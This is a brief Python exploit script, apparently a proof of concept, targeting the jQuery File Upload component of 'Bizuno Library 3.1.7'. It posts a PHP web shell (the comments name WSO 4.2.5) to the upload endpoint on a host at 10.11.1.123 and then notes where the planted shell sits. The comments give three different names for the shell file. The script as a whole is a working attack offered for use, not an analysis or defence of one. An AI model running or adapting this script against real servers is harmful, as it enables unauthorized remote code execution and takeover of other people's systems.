#!/usr/bin/python
import requests
# Host IP http://IP
host='http://10.11.1.123'
# JQuery path for Bizuno Library 3.1.7
url=host+'/Books/apps/jquery-file-upload/server/php/index.php'
# Uploading the shell to the server. I use wso-4.2.5.php in this example:
files = {'files': open('webshell.php', 'rb')}
r = requests.post(url, files=files)
# Location of Shell/Name - wso.php
shellloc=host+'/Books/apps/jquery-file-upload/server/php/files/wbshl.php'
